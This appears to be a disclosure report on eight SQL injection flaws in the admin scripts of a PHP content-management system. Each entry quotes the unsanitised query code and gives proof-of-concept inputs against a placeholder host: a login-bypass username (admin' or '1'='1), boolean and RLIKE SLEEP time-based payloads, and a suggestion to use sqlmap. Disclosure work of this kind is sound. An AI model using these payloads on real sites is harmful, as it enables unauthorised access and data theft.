Use php5 for verifying bugs.
------------FIRST ONE-------------------------------------------------------------------
affected source code file: /admin/login.php
--------------------------------
affected source code:
.....
  <?php
    $id = getvar('id');
    $list = $db->getOneRow(get_sql("select * from {pre}manager where id = " . $id));
    //die($list);
    //die($result1);
  ?>
.....
--------------------------------
affected reason:

      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/login.php
--------------------------------
affected executable: 
  
  visit url:http://xx.xx.com/admin/login.php
  use: admin' or '1'='1 as the username;  Then we can log in to the background with any password.



------------SECOND ONE-------------------------------------------------------------------
affected source code file: /admin/manager/admin_mod.php
--------------------------------
affected source code:

    .....
    <?php
        $id = getvar('id');
        $list = $db->getOneRow(get_sql("select * from {pre}manager where id = " . $id));
        //die($list);
        //die($result1);
    ?>
     .....

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/manager/admin_mod.php
--------------------------------
affected executable: 
  Like this: 
             http://xx.xx.com/admin/manager/admin_mod.php?id=2'
             http://xx.xx.com/admin/manager/admin_mod.php?id=2 RLIKE SLEEP(2)
             
Then, we can use tools like sqlmap for more information.




------------THIRD ONE-----------------------------------------------------------------
affected source code file: /admin/news/news_mod.php
--------------------------------
affected source code:
  .....
    <?php
        session_start();
        require '../session.php'; include '../../inc/const.php';
        include '../../inc/editor/fckeditor.php';
        $id= getvar('id');
        $list = $db->getOneRow(get_sql("select * from {pre}content where id = " . $id));
    ?>
     .....

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/news/news_mod.php
--------------------------------
affected executable: 
  Like this: 
             http://xx.xx.com/admin/news/news_mod.php?id=1'
             http://xx.xx.com/admin/news/news_mod.php?id=1 and 1=1
             http://xx.xx.com/admin/news/news_mod.php?id=1 and 1=2
             http://xx.xx.com/admin/news/news_mod.php?id=1 RLIKE SLEEP(2)
             
Then, we can use tools like sqlmap for more information.


------------FOURTH ONE-----------------------------------------------------------------
affected source code file: /admin/news/sort_mod.php
--------------------------------
affected source code:

    <?php
    .....  
        $id= getvar('id');
          .....
        $list = $db->getOneRow(get_sql("select * from {pre}class where id = " . $id));
        .....
    ?>
     

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/news/sort_mod.php
--------------------------------
affected executable: 
  After Signing in to the background in advance. Then: 
  Like this: 
             http://xx.xx.com/admin/news/sort_mod.php?id=1'
             http://xx.xx.com/admin/news/sort_mod.php?id=1 and 1=1
             http://xx.xx.com/admin/news/sort_mod.php?id=1 and 1=2
             http://xx.xx.com/admin/news/sort_mod.php?id=1 RLIKE SLEEP(2)
             
Then, we can use tools like sqlmap for more information.


------------FIFTH ONE-----------------------------------------------------------------
affected source code file: /admin/link/link_mod.php
--------------------------------
affected source code:

    ..... 
    <?php
        session_start();
        require '../session.php'; 
        include '../../inc/const.php';
        include ("../../inc/editor/fckeditor.php");
        $id= getvar('id');
        $sqlstr=get_sql("select * from {pre}link where id=".$id);
        $list=$db->getonerow($sqlstr);
    ?>
    ..... 
     

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/link/link_mod.php
--------------------------------
affected executable: 
  After Signing in to the background in advance. Then: 
  Like this: 
             http://xx.xx.com/admin/link/link_mod.php?id=1'
             http://xx.xx.com/admin/link/link_mod.php?id=1 and 1=1
             http://xx.xx.com/admin/link/link_mod.php?id=1 and 1=2
             http://xx.xx.com/admin/link/link_mod.php?id=1 RLIKE SLEEP(2)
             
Then, we can use tools like sqlmap for more information.



------------SIXTH ONE-----------------------------------------------------------------
affected source code file: /admin/link/link_ok.php
--------------------------------
affected source code:

    <?php
        require_once '../../inc/const.php';

        $act = $_GET['act'];
        $id =getvar('id');
        $name =getvar('name');
        $url =getvar('url');
        $content =getvar('content');
        $state = getvar('state');


        if($act=='add'){
          $record = array(
            'name'		=>$name,
            'url'		=>$url,
            'content'	=>$content,
            'addtime'	=>date("y-m-d H-i-s"),
            'state'		=>$state
          );
          $id = $db->insert($GLOBALS[databasePrefix].'link',$record);
          echo "<script>alert('添加成功!');window.location='link_manage.php';</script>";
        }
        if ($act=='mod'){
          $record = array(
            'name'		=>$name,
            'url'		=>$url,
            'content'	=>$content,
            'state'		=>$state
          );
          $db->update($GLOBALS[databasePrefix].'link',$record,'id='.$id);
          echo "<script>alert('修改成功!');window.location='link_manage.php';</script>";
        }

        if ($act=='del') {
          //del_file($id);
          $db->delete($GLOBALS[databasePrefix].'link',"id=".$id);
          echo "<script>alert('删除成功!');window.location='link_manage.php';</script>";
        }

    ?>
     

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/link/link_ok.php
--------------------------------
affected executable: 
  After Signing in to the background in advance. Then we can use burpsuit to grab the following URL packets: 
  
  Like this: 
             http://xx.xx.com/admin/link/link_ok.php?act=del&id=1'
             http://xx.xx.com/admin/link/link_ok.php?act=del&id=1 and 1=1
             http://xx.xx.com/admin/link/link_ok.php?act=del&id=1 and 1=2
             http://xx.xx.com/admin/link/link_ok.php?act=del&id=1 RLIKE SLEEP(2)
             
  And we can see the sql injection problems.
  Then, we can use tools like sqlmap for more information.


------------SEVENTH ONE-----------------------------------------------------------------
affected source code file: /admin/news/sort_ok.php
--------------------------------
affected source code:

    <?php
        require_once '../../inc/const.php';
        $act = $_GET['act'];
        $id =getvar('id');
        .....
        if ($act=='mod'){
        $record = array(
          'fid'		=>$fid,
          'name'		=>$name,
          'style'		=>$title_color,
          'title_bold'=>$title_bold,
          'title_em'	=>$title_em,
          'title_u'	=>$title_u,
          'ckeywords'	=>$ckeywords,
          'cdescription'	=>$cdescription,
          'template'	=>$tpl_list,
          'templateview'	=>$tpl_view,	
          'rank'		=>$rank
        );
        $db->update($GLOBALS[databasePrefix].'class',$record,'id='.$id);
        echo "<script>alert('修改成功!');window.location='sort_manage.php';</script>";
      }

      //删除
      if ($act=='del') {
        $db->delete($GLOBALS[databasePrefix].'class','id='.$id);
        echo "<script>alert('删除成功!');window.location='sort_manage.php';</script>";
      }
      ?>
     

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/news/sort_ok.php
--------------------------------
affected executable: 
  After Signing in to the background in advance. Then we can use burpsuit to grab the following URL packets: 
  
  Like this: 
             http://xx.xx.com/admin/news/sort_ok.php?act=del&id=1'
             http://xx.xx.com/admin/news/sort_ok.php?act=del&id=1 and 1=1
             http://xx.xx.com/admin/news/sort_ok.php?act=del&id=1 and 1=2
             http://xx.xx.com/admin/news/sort_ok.php?act=del&id=1 RLIKE SLEEP(2)
             
  And we can see the sql injection problems.
  Then, we can use tools like sqlmap for more information.



------------EIGHTH ONE-----------------------------------------------------------------
affected source code file: /admin/news/news_ok.php
--------------------------------
affected source code:

    <?php
        require_once '../../inc/const.php';
        $act = $_GET['act'];
        $id =getvar('id');
        .....
        if ($act=='mod'){
            $record = array(
              'cid'	=>$cid,
              'title'		=>$title,
              'style'		=>$title_color,
              'title_bold'=>$title_bold,
              'title_em'	=>$title_em,
              'title_u'	=>$title_u,
              'picture'	=>$pic,		
              'rank'		=>$rank,
              'iscommend'	=>$iscommend,
              'ispicture'	=>$ispicture,
              'dateline'	=>date("y-m-d H-i-s"),
              'content'	=>$content
            );
            $db->update($GLOBALS[databasePrefix].'content',$record,'id='.$id);
            echo "<script>alert('修改成功!');window.location='news_manage.php';</script>";
          }

          //删除
          if ($act=='del') {
            //del_file($id);
            $db->delete($GLOBALS[databasePrefix].'content',"id=".$id);
            echo "<script>alert('删除成功!');window.location='news_manage.php';</script>";
          }

      ?>
     

--------------------------------
affected reason:
      We can see the $id parameter has not been safely processed. So, the SQL injection can be achieved by constructing SQL injection statements in /admin/news/news_ok.php
--------------------------------
affected executable: 
  After Signing in to the background in advance. Then we can use burpsuit to grab the following URL packets: 
  
  Like this: 
             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2'
             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2 and 1=1
             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2 and 1=2
             http://xx.xx.com/admin/news/news_ok.php?act=del&id=2 RLIKE SLEEP(2)
             
  And we can see the sql injection problems.
  Then, we can use tools like sqlmap for more information.
